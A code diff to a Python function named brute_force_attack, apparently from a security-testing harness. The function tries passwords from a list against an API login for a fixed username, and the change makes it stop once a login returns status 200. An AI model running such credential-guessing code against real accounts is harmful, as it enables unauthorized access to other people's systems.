@@ -15,7 +15,9 @@ def brute_force_attack():
     passwords = ctx.file_manager.get_brute_force_passwords
     client_service = ApiClientService()
     for password in passwords:
-        client_service.login(username=USER_NAME, password=password)
+        response = client_service.login(username=USER_NAME, password=password)
+        if response["status_code"] == 200:
+            break
 
 
 if __name__ == "__main__":
